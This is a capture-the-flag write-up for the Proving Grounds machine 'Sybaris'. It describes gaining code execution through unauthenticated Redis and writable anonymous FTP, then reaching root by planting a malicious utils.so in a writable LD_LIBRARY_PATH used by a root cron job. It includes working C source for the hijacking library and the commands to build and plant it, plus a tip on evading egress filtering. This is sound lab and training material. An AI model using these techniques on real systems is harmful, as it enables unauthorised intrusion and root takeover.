# Sybaris — Proving Grounds

> [!abstract] Summary
> Sybaris exposes **Redis** (port 6379) with no authentication and **anonymous FTP** (port 21) with a world-writable `pub` directory. We compile the `RedisModules-ExecuteCommand` malicious module, upload it via FTP to a path Redis can read (`/var/ftp/pub/module.so`), load it with `MODULE LOAD`, and use `system.exec` for command execution as the user **`pablo`**. Privilege escalation abuses a **root cron job** that runs a binary which dynamically loads a missing `utils.so`; because the binary's `LD_LIBRARY_PATH` includes the writable `/usr/local/lib/dev`, planting a malicious `utils.so` there executes our code as root.

**Target:** `192.168.143.93`

## Methodology

1. Scan all TCP ports; note anonymous FTP (writable `pub`) and unauthenticated Redis.
2. Build a Redis command-execution module and upload it via FTP.
3. `MODULE LOAD` it and get a reverse shell as `pablo` via `system.exec`.
4. Find the root cron job and its missing `utils.so` + writable `LD_LIBRARY_PATH`.
5. Plant a malicious `utils.so` → root.

## Privilege escalation — hijack a missing `utils.so` in a root cron

Enumerate cron and processes (`cat /etc/crontab`, `pspy`). A root cron job periodically runs a custom binary that links against a shared library `utils.so` which does **not** exist on the standard path. The binary's `LD_LIBRARY_PATH` includes **`/usr/local/lib/dev`**, which `pablo` can write to.

> [!info] Why this works
> The dynamic linker searches `LD_LIBRARY_PATH` directories for required `.so` files *before* the system paths. If a required library is missing and one of those directories is writable, we can plant our own library with the right name. Its constructor (`__attribute__((constructor))`) runs as soon as the root process loads it.

Build a malicious `utils.so` whose constructor escalates (e.g. SUID bash):

```c
// utils.c
#include <stdlib.h>
#include <unistd.h>
static void init() __attribute__((constructor));
void init() {
    setuid(0); setgid(0);
    system("chmod u+s /bin/bash");
}
```

```
gcc -shared -fPIC -o utils.so utils.c
cp utils.so /usr/local/lib/dev/utils.so
```

Wait for the root cron to run. When it executes the binary, the linker loads our `/usr/local/lib/dev/utils.so` as root and SUIDs `/bin/bash`:

```
ls -la /bin/bash     # -rwsr-xr-x once it fires
/bin/bash -p
id                   # euid=0
```

> [!tip] Alternative privesc
> If the cron/`LD_LIBRARY_PATH` path is patched on your instance, LinPEAS also flags **PwnKit (CVE-2021-4034)** on this box, which gives root independent of the cron. Prefer the intended `utils.so` route when it's available.

## Lessons learned

- Writable anonymous FTP + unauthenticated Redis is a classic chain: FTP is the file-delivery mechanism, Redis `MODULE LOAD` is the execution primitive. Map file-write and code-exec primitives separately, then combine them.
- Match the reverse-shell callback port to an already-open service port (6379 here) to slip past egress filtering.
- For privesc, hunt for processes that load libraries from writable directories (`LD_LIBRARY_PATH`, missing `.so`). A library constructor planted in a writable search path runs with the loading process's privileges.
- `pspy` / `/etc/crontab` first — a root cron running a custom binary is a frequent PG escalation.
